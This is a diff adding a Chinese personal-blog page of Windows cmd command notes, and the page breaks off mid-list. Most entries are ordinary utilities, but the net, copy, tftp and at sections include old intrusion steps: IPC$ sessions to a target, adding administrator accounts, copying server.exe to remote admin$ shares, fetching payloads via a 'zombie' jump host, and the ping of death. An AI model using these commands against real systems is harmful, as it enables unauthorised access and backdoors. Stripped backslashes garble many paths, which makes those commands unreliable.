@@ -1,0 +1,1989 @@
+<!DOCTYPE html>
+<html lang="en">
+
+
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="referrer" content="never">
+<!--可以让img标签预加载网络图片-->
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="Leaning and function with your new object.">
+    <meta name="keywords" content="JF, JF Blog, 敬方的个人博客, OpenCV, 敬方, Qt, C++, 流媒体，计算机视觉，高性能计算">
+    <meta name="theme-color" content="#000000">
+    
+    <title>cmd 命令大全学习笔记 - 敬方的个人博客 | JF Blog</title>
+
+    <!-- Web App Manifest -->
+    <link rel="manifest" href="/pwa/manifest.json">
+
+    <!-- Favicon -->
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <!-- Safari Webpage Icon    by-BY -->
+    <link rel="apple-touch-icon" href="/img/apple-touch-icon.png">
+    
+    <!-- Canonical URL -->
+    <link rel="canonical" href="https://wangpengcheng.github.io//2019/04/10/cmd/">
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="https://wangpengcheng.github.io//css/bootstrap.min.css">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="https://wangpengcheng.github.io//css/hux-blog.min.css">
+
+    <!-- Pygments Github CSS -->
+    <link rel="stylesheet" href="https://wangpengcheng.github.io//css/syntax.css" type="text/css">
+
+    <!-- Custom Fonts -->
+    <!-- <link href="http://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
+    <!-- Hux change font-awesome CDN to qiniu -->
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+
+    <!-- Hux Delete, sad but pending in China
+    <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/
+    css'>
+    -->
+
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
+
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">My Blog</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+                    
+                    <li>
+                        <a href="/about/">About</a>
+                    </li>
+                    
+                    <li>
+                        <a href="/tags/">Tags</a>
+                    </li>
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    var __HuxNav__ = {
+        close: function(){
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        },
+        open: function(){
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+
+    // Bind Event
+    $toggle.addEventListener('click', function(e){
+        if ($navbar.className.indexOf('in') > 0) {
+            __HuxNav__.close()
+        }else{
+            __HuxNav__.open()
+        }
+    })
+
+    /**
+     * Since Fastclick is used to delegate 'touchstart' globally
+     * to hack 300ms delay in iOS by performing a fake 'click',
+     * Using 'e.stopPropagation' to stop 'touchstart' event from 
+     * $toggle/$collapse will break global delegation.
+     * 
+     * Instead, we use a 'e.target' filter to prevent handler
+     * added to document close HuxNav.  
+     *
+     * Also, we use 'click' instead of 'touchstart' as compromise
+     */
+    document.addEventListener('click', function(e){
+        if(e.target == $toggle) return;
+        if(e.target.className == 'icon-bar') return;
+        __HuxNav__.close();
+    })
+</script>
+
+
+    <!-- Image to hack wechat -->
+<!-- <img src="/img/icon_wechat.png" width="0" height="0"> -->
+<!-- <img src="/img/post-bg-ios10.jpg" width="0" height="0"> -->
+
+<!-- Post Header -->
+<style type="text/css">
+    header.intro-header{
+        position: relative;
+        background-image: url('/img/post-bg-ios10.jpg')
+    }
+
+    
+</style>
+<header class="intro-header">
+    <div class="header-mask"></div>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                        <a class="tag" href="/tags/#cmd" title="cmd">cmd</a>
+                        
+                        <a class="tag" href="/tags/#windows" title="windows">windows</a>
+                        
+                        <a class="tag" href="/tags/#bat" title="bat">bat</a>
+                        
+                    </div>
+                    <h1>cmd 命令大全学习笔记</h1>
+                    
+                    
+                    <h2 class="subheading">cmd 命令大全 的学习笔记</h2>
+                    
+                    <span class="meta">Posted by 敬方 on April 10, 2019</span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+    <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+				<h2 id="运行操作">运行操作</h2>
+
+<blockquote>
+  <p>CMD命令：开始－&gt;运行－&gt;键入cmd或command(在命令行里可以看到系统版本、文件系统版本)</p>
+</blockquote>
+
+<h3 id="cmd命令锦集">CMD命令锦集:</h3>
+
+<ol>
+  <li>gpedit.msc—–组策略</li>
+  <li>sndrec32——-录音机</li>
+  <li>Nslookup——-IP地址侦测器 ，是一个 监测网络中 DNS 服务器是否能正确实现域名解析的命令行工具。 它在 Windows NT/2000/XP 中均可使用 , 但在 Windows 98 中却没有集成这一个工具。</li>
+  <li>explorer——-打开资源管理器</li>
+  <li>logoff———注销命令</li>
+  <li>shutdown——-60秒倒计时关机命令</li>
+  <li>lusrmgr.msc—-本机用户和组</li>
+  <li>services.msc—本地服务设置</li>
+  <li>oobe/msoobe /a—-检查XP是否激活</li>
+  <li>notepad——–打开记事本</li>
+  <li>cleanmgr——-垃圾整理</li>
+  <li>net start messenger—-开始信使服务</li>
+  <li>compmgmt.msc—计算机管理</li>
+  <li>net stop messenger—–停止信使服务</li>
+  <li>conf———–启动netmeeting</li>
+  <li>dvdplay——–DVD播放器</li>
+  <li>charmap——–启动字符映射表</li>
+  <li>diskmgmt.msc—磁盘管理实用程序</li>
+  <li>calc———–启动计算器</li>
+  <li>dfrg.msc——-磁盘碎片整理程序</li>
+  <li>chkdsk.exe—–Chkdsk磁盘检查</li>
+  <li>devmgmt.msc— 设备管理器</li>
+  <li>regsvr32 /u *.dll—-停止dll文件运行</li>
+  <li>drwtsn32—— 系统医生</li>
+  <li>rononce -p—-15秒关机</li>
+  <li>dxdiag———检查DirectX信息</li>
+  <li>regedt32——-注册表编辑器</li>
+  <li>Msconfig.exe—系统配置实用程序</li>
+  <li>rsop.msc——-组策略结果集</li>
+  <li>mem.exe——–显示内存使用情况</li>
+  <li>regedit.exe—-注册表</li>
+  <li>winchat——–XP自带局域网聊天</li>
+  <li>progman——–程序管理器</li>
+  <li>winmsd———系统信息</li>
+  <li>perfmon.msc—-计算机性能监测程序</li>
+  <li>winver———检查Windows版本</li>
+  <li>sfc/scannow—–扫描错误并复原</li>
+  <li>taskmgr—–任务管理器（2000/xp/2003</li>
+  <li>wmimgmt.msc—-打开windows管理体系结构(WMI)</li>
+  <li>wupdmgr——–windows更新程序</li>
+  <li>wscript——–windows脚本宿主设置</li>
+  <li>write———-写字板</li>
+  <li>wiaacmgr——-扫描仪和照相机向导</li>
+  <li>winchat——–XP自带局域网聊天</li>
+  <li>mplayer2——-简易widnows media player</li>
+  <li>mspaint——–画图板</li>
+  <li>mstsc———-远程桌面连接</li>
+  <li>magnify——–放大镜实用程序</li>
+  <li>mmc————打开控制台</li>
+  <li>mobsync——–同步命令</li>
+  <li>iexpress——-木马捆绑工具，系统自带</li>
+  <li>fsmgmt.msc—–共享文件夹管理器</li>
+  <li>utilman——–辅助工具管理器</li>
+  <li>dcomcnfg——-打开系统组件服务</li>
+  <li>ddeshare——-打开DDE共享设置</li>
+  <li>osk————打开屏幕键盘</li>
+  <li>odbcad32——-ODBC数据源管理器</li>
+  <li>oobe/msoobe /a—-检查XP是否激活</li>
+  <li>ntbackup——-系统备份和还原</li>
+  <li>narrator——-屏幕“讲述人”</li>
+  <li>ntmsmgr.msc—-移动存储管理器</li>
+  <li>ntmsoprq.msc—移动存储管理员操作请求</li>
+  <li>netstat -an—-(TC)命令检查接口</li>
+  <li>syncapp——–创建一个公文包</li>
+  <li>sysedit——–系统配置编辑器</li>
+  <li>sigverif——-文件签名验证程序</li>
+  <li>ciadv.msc——索引服务程序</li>
+  <li>shrpubw——–创建共享文件夹</li>
+  <li>secpol.msc—–本地安全策略</li>
+  <li>syskey———系统加密，一旦加密就不能解开，保护windows xp系统的双重密码</li>
+  <li>services.msc—本地服务设置</li>
+  <li>Sndvol32——-音量控制程序</li>
+  <li>sfc.exe——–系统文件检查器</li>
+  <li>sfc /scannow—windows文件保护</li>
+  <li>ciadv.msc——索引服务程序</li>
+  <li>tourstart——xp简介（安装完成后出现的漫游xp程序）</li>
+  <li>taskmgr——–任务管理器</li>
+  <li>eventvwr——-事件查看器</li>
+  <li>eudcedit——-造字程序</li>
+  <li>compmgmt.msc—计算机管理</li>
+  <li>packager——-对象包装程序</li>
+  <li>perfmon.msc—-计算机性能监测程序</li>
+  <li>charmap——–启动字符映射表</li>
+  <li>cliconfg——-SQL SERVER 客户端网络实用程序</li>
+  <li>Clipbrd——–剪贴板查看器</li>
+  <li>conf———–启动netmeeting</li>
+  <li>certmgr.msc—-证书管理实用程序</li>
+  <li>regsvr32 /u *.dll—-停止dll文件运行</li>
+  <li>regsvr32 /u zipfldr.dll——取消ZIP支持</li>
+  <li>cmd.exe——–CMD命令提示符
+    <h2 id="操作详解">操作详解</h2>
+    <hr>
+    <h3 id="网络操作详解">网络操作详解：</h3>
+    <p>windows cmd 使用net 进行网络连接，详细参数如下：</p>
+  </li>
+</ol>
+
+<ul>
+  <li>
+<code class="language-plaintext highlighter-rouge">net use ipipc$ " " /user:" " </code>建立IPC空链接</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">net use ipipc$ "密码" /user:"用户名" </code>建立IPC非空链接</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">net use h: ipc$ "密码" /user:"用户名" </code>直接登陆后映射对方C：到本地为H:</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">net use h: ipc$ </code>登陆后映射对方C：到本地为H:</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">net use ipipc$ /del </code>删除IPC链接</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">net use h: /del </code>删除映射对方到本地的为H:的映射</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">net user 用户名　密码　/add</code> 建立用户</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">net user guest /active:yes </code>激活guest用户</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">net user </code>查看有哪些用户</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">net user</code> 帐户名 查看帐户的属性</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">net localgroup administrators 用户名 /add</code> 把“用户”添加到管理员中使其具有管理员权限</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">net start</code> 查看开启了哪些服务</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">net start</code> 服务名　开启服务；(如:<code class="language-plaintext highlighter-rouge">net start telnet</code>， <code class="language-plaintext highlighter-rouge">net start schedule</code>)</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">net stop</code> 服务名 停止某服务</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">net time</code> 目标<code class="language-plaintext highlighter-rouge">ip</code> 查看对方时间</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">net time</code> 目标<code class="language-plaintext highlighter-rouge">ip /set</code> 设置本地计算机时间与“目标IP”主机的时间同步,加上<code class="language-plaintext highlighter-rouge">参数/yes</code>可取消确认信息</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">net view</code> 查看本地局域网内开启了哪些共享</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">net view ip</code> 查看对方局域网内开启了哪些共享</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">net config</code> 显示系统网络设置</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">net logoff</code> 断开连接的共享</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">net pause</code> 服务名 暂停某服务</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">net send ip "文本信息"</code> 向对方发信息</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">net ver</code> 局域网内正在使用的网络连接类型和信息</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">net share</code> 查看本地开启的共享</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">net share ipc$</code> 开启<code class="language-plaintext highlighter-rouge">ipc$</code>共享</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">net share ipc$ /del </code>删除<code class="language-plaintext highlighter-rouge">ipc$</code>共享</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">net share c$ /del</code> 删除C：共享</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">net user guest 12345</code> 用guest用户登陆后用将密码改为12345</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">net password 密码</code> 更改系统登陆密码</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">netstat -a </code>查看开启了哪些端口,常用<code class="language-plaintext highlighter-rouge">netstat -an</code>
+</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">netstat -n</code> 查看端口的网络连接情况，常用<code class="language-plaintext highlighter-rouge">netstat -an</code>
+</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">netstat -v </code>查看正在进行的工作</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">netstat -p</code> 协议名 例：<code class="language-plaintext highlighter-rouge">netstat -p tcq/ip</code> 查看某协议使用情况</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">netstat -s</code> 查看正在使用的所有协议使用情况</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">nbtstat -A ip</code> 对方136到139其中一个端口开了的话，就可查看对方最近登陆的用户名</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">tracert -参数 ip(或计算机名)</code> 跟踪路由（数据包） ，参数：<code class="language-plaintext highlighter-rouge">-w数字</code>用于设置超时间隔。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">ping ip(或域名) </code>向对方主机发送默认大小为32字节的数据，参数：<code class="language-plaintext highlighter-rouge">-l[空格]数据包大小</code>；<code class="language-plaintext highlighter-rouge">-n发送数据次数</code>；<code class="language-plaintext highlighter-rouge">-t</code>指一直<code class="language-plaintext highlighter-rouge">ping</code>。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">ping -t -l 65550 ip</code> 死亡之ping(发送大于64K的文件并一直ping就成了死亡之ping)</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">ipconfig (winipcfg)</code> 用于windows NT及XP(windows 95 98)查看本地ip地址，<code class="language-plaintext highlighter-rouge">ipconfig</code>可用参数<code class="language-plaintext highlighter-rouge">/all</code>显示全部配置信息</li>
+</ul>
+
+<p>　　</p>
+<h3 id="进程和文件管理">进程和文件管理</h3>
+<hr>
+
+<ul>
+  <li>
+<code class="language-plaintext highlighter-rouge">tlist -t</code>  以树行列表显示进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内)</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">kill -F</code> 进程名 加<code class="language-plaintext highlighter-rouge">-F</code>参数后强制结束某进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内)</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">del -F</code> 文件名 加<code class="language-plaintext highlighter-rouge">-F</code>参数后就可删除只读文件,<code class="language-plaintext highlighter-rouge">/AR、/AH、/AS、/AA</code>分别表示删除只读、隐藏、系统、存档文件，<code class="language-plaintext highlighter-rouge">/A-R、/A-H、/A-S、/A-A</code>表示删除除只读、隐藏、系统、存档以外的文件。例如<code class="language-plaintext highlighter-rouge">DEL/AR *.*</code>表示删除当前目录下所有只读文件，<code class="language-plaintext highlighter-rouge">DEL/A-S *.*</code>表示删除当前目录下除系统文件以外的所有文件</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">del /S /Q 目录</code> 或用：<code class="language-plaintext highlighter-rouge">rmdir /s /Q 目录 /S</code>删除目录及目录下的所有子目录和文件。同时使用参数<code class="language-plaintext highlighter-rouge">/Q</code> 可取消删除操作时的系统确认就直接删除。（二个命令作用相同）</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">move</code> 盘符路径要移动的文件名　存放移动文件的路径移动后文件名 移动文件,用参数/y将取消确认移动目录存在相同文件的提示就直接覆盖</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">fc one.txt two.txt &gt; 3st.txt</code> 对比二个文件并把不同之处输出到3st.txt文件中，<code class="language-plaintext highlighter-rouge">&gt; </code>和<code class="language-plaintext highlighter-rouge">&gt;&gt;</code> 是重定向命令</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">at id号</code> 开启已注册的某个计划任务</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">at /delete</code> 停止所有计划任务，用参数<code class="language-plaintext highlighter-rouge">/yes</code>则不需要确认就直接停止</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">at id号 /delete</code> 停止某个已注册的计划任务</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">at</code> 查看所有的计划任务</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">at ip time 程序名(或一个命令) /r</code> 在某时间运行对方某程序并重新启动计算机</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">finger username @host</code> 查看最近有哪些用户登陆</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">telnet ip 端口</code> 远和登陆服务器,默认端口为23</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">open ip</code> 连接到IP（属telnet登陆后的命令）</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">telnet</code> 在本机上直接键入telnet 将进入本机的telnet</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">copy 路径文件名1　路径文件名2 /y</code> 复制文件1到指定的目录为文件2，用参数/y就同时取消确认你要改写一份现存目录文件</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">copy c:srv.exe ipadmin$</code> 复制本地<code class="language-plaintext highlighter-rouge">c:srv.exe</code>到对方的<code class="language-plaintext highlighter-rouge">admin</code>下</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">copy 1st.jpg/b+2st.txt/a 3st.jpg</code> 将<code class="language-plaintext highlighter-rouge">2st.txt</code>的内容藏身到<code class="language-plaintext highlighter-rouge">1st.jpg</code>中生成<code class="language-plaintext highlighter-rouge">3st.jpg</code>新的文件，注：<code class="language-plaintext highlighter-rouge">2st.txt</code>文件头要空三排，参数：/b指二进制文件，/a指ASCLL格式文件</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">copy ipadmin$svv.exe c: </code>或:<code class="language-plaintext highlighter-rouge">copyipadmin$*.*</code> 复制对方<code class="language-plaintext highlighter-rouge">admini$</code>共享下的<code class="language-plaintext highlighter-rouge">srv.exe</code>文件（所有文件）至本地<code class="language-plaintext highlighter-rouge">C：</code>
+</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">xcopy</code> 要复制的文件或目录树目标地址目录名 复制文件和目录树，用参数<code class="language-plaintext highlighter-rouge">/Y</code>将不提示覆盖相同文件
+用参数<code class="language-plaintext highlighter-rouge">/e</code>才可连目录下的子目录一起复制到目标地址下。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">tftp -i 自己IP</code>(用肉机作跳板时这用肉机IP) get server.exe c:server.exe 登陆后，将“IP”的server.exe下载到目标主机c:server.exe 参数：<code class="language-plaintext highlighter-rouge">-i</code>指以二进制模式传送，如传送exe文件时用，如不加<code class="language-plaintext highlighter-rouge">-i</code> 则以<code class="language-plaintext highlighter-rouge">ASCII</code>模式（传送文本文件模式）进行传送
+　　<code class="language-plaintext highlighter-rouge">tftp -i 对方IP</code>　put c:server.exe 登陆后，上传本地c:server.exe至主机</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">ftp ip 端口</code> 用于上传文件至服务器或进行文件操作，默认端口为21。bin指用二进制方式传送（可执行文件进）；默认为ASCII格式传送(文本文件时)</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">route print </code>显示出IP路由，将主要显示网络地址<code class="language-plaintext highlighter-rouge">Network addres</code>，子网掩码<code class="language-plaintext highlighter-rouge">Netmask</code>，网关地址<code class="language-plaintext highlighter-rouge">Gateway addres</code>，接口地址Interface</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">arp</code> 查看和处理<code class="language-plaintext highlighter-rouge">ARP</code>缓存，ARP是名字解析的意思，负责把一个IP解析成一个物理性的MAC地址。<code class="language-plaintext highlighter-rouge">arp -a</code>将显示出全部信息</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">start</code> 程序名或命令<code class="language-plaintext highlighter-rouge"> /max</code> 或<code class="language-plaintext highlighter-rouge">/min</code> 新开一个新窗口并最大化（最小化）运行某程序或命令</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">mem</code> 查看cpu使用情况</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">attrib 文件名(目录名)</code> 查看某文件（目录）的属性</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">attrib 文件名 -A -R -S -H 或 +A +R +S +H</code> 去掉(添加)某文件的 存档，只读，系统，隐藏 属性；用+则是添加为某属性</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">dir</code> 查看文件，参数：<code class="language-plaintext highlighter-rouge">/Q</code>显示文件及目录属系统哪个用户，<code class="language-plaintext highlighter-rouge">/T:C</code>显示文件创建时间，<code class="language-plaintext highlighter-rouge">/T:A</code>显示文件上次被访问时间，<code class="language-plaintext highlighter-rouge">/T:W</code>上次被修改时间</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">date /t 、 time /t</code> 使用此参数即<code class="language-plaintext highlighter-rouge">DATE/T</code>、<code class="language-plaintext highlighter-rouge">TIME/T</code>将只显示当前日期和时间，而不必输入新日期和时间</li>
+</ul>
+
+<h3 id="环境变量设置">环境变量设置</h3>
+<ul>
+  <li>
+<code class="language-plaintext highlighter-rouge">set</code> 指定环境变量名称=要指派给变量的字符 设置环境变量</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">set</code> 显示当前所有的环境变量</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">set p</code>(或其它字符) 显示出当前以字符p(或其它字符)开头的所有环境变量</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">pause</code> 暂停批处理程序，并显示出：请按任意键继续….</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">if</code> 在批处理程序中执行条件处理（更多说明见if命令及变量）</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">goto</code> 标签 将cmd.exe导向到批处理程序中带标签的行（标签必须单独一行，且以冒号打头，例如：“：start”标签）</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">call</code> 路径批处理文件名 从批处理程序中调用另一个批处理程序 （更多说明见call /?）</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">for</code> 对一组文件中的每一个文件执行某个特定命令（更多说明见for命令及变量）</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">echo on</code> 或<code class="language-plaintext highlighter-rouge">off</code> 打开或关闭<code class="language-plaintext highlighter-rouge">echo</code>，仅用<code class="language-plaintext highlighter-rouge">echo</code>不加参数则显示当前echo设置</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">echo</code> 信息 在屏幕上显示出信息</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">echo 信息 &gt;&gt; pass.txt</code> 将”信息”保存到pass.txt文件中</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">findstr "Hello" aa.txt </code>在aa.txt文件中寻找字符串hello</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">find 文件名 </code>查找某文件</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">title 标题名字 </code>更改CMD窗口标题名字</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">color 颜色值</code> 设置cmd控制台前景和背景颜色；0=黑、1=蓝、2=绿、3=浅绿、4=红、5=紫、6=黄、7=白、8=灰、9=淡蓝、A=淡绿、B=淡浅绿、C=淡红、D=淡紫、E=淡黄、F=亮白</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">prompt 名称</code> 更改cmd.exe的显示的命令提示符(把C:、D:统一改为：EntSky )</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">ver </code>在DOS窗口下显示版本信息</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">winver</code> 弹出一个窗口显示版本信息（内存大小、系统版本、补丁版本、计算机名）</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">format 盘符 /FS:类型</code> 格式化磁盘,类型:FAT、FAT32、NTFS ,例：Format D: /FS:NTFS</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">md　目录名</code> 创建目录</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">replace 源文件</code>　要替换文件的目录 替换文件</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">ren 原文件名</code>　新文件名 重命名文件名</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">tree</code> 以树形结构显示出目录，用参数-f 将列出第个文件夹中文件名称</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">type 文件名</code> 显示文本文件的内容</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">more 文件名</code> 逐屏显示输出文件</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">doskey</code> 要锁定的命令=字符</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">doskey</code> 要解锁命令= 为DOS提供的锁定命令(编辑命令行，重新调用win2k命令，并创建宏)。如：锁定<code class="language-plaintext highlighter-rouge">dir</code>命令：<code class="language-plaintext highlighter-rouge">doskey dir=entsky </code>(不能用doskey dir=dir)；解锁：<code class="language-plaintext highlighter-rouge">doskey dir=</code>
+</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">taskmgr</code> 调出任务管理器</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">chkdsk /F D</code>: 检查磁盘D并显示状态报告；加参数/f并修复磁盘上的错误</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">tlntadmn telnt服务admn,</code>键入tlntadmn选择3，再选择8,就可以更改telnet服务默认端口23为其它任何端口</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">exit</code> 退出cmd.exe程序或目前，用参数/B则是退出当前批处理脚本而不是cmd.exe</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">path</code> 路径可执行文件的文件名 为可执行文件设置一个路径。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">cmd</code> 启动一个win2K命令解释窗口。参数：<code class="language-plaintext highlighter-rouge">/eff</code>、<code class="language-plaintext highlighter-rouge">/en</code> 关闭、开启命令扩展；更我详细说明见<code class="language-plaintext highlighter-rouge">cmd /?</code>
+</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">regedit /s</code> 注册表文件名 导入注册表；参数<code class="language-plaintext highlighter-rouge">/S</code>指安静模式导入，无任何提示；</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">regedit /e</code> 注册表文件名 导出注册表</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">cacls 文件名</code>　参数 显示或修改文件访问控制列表（ACL）——针对NTFS格式时。参数：<code class="language-plaintext highlighter-rouge">/D</code> 用户名:设定拒绝某用户访问；<code class="language-plaintext highlighter-rouge">/P 用户名</code>:<code class="language-plaintext highlighter-rouge">perm</code> 替换指定用户的访问权限；<code class="language-plaintext highlighter-rouge">/G 用户名:perm</code> 赋予指定用户访问权限；<code class="language-plaintext highlighter-rouge">Perm</code> 可以是: <code class="language-plaintext highlighter-rouge">N</code> 无，<code class="language-plaintext highlighter-rouge">R</code> 读取， <code class="language-plaintext highlighter-rouge">W</code> 写入， <code class="language-plaintext highlighter-rouge">C </code>更改(写入)，<code class="language-plaintext highlighter-rouge">F</code> 完全控制；例：<code class="language-plaintext highlighter-rouge">cacls D: est.txt /D pub</code> 设定<code class="language-plaintext highlighter-rouge">d: est.txt</code>拒绝pub用户访问。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">cacls</code> 文件名 查看文件的访问用户权限列表</li>
+  <li>
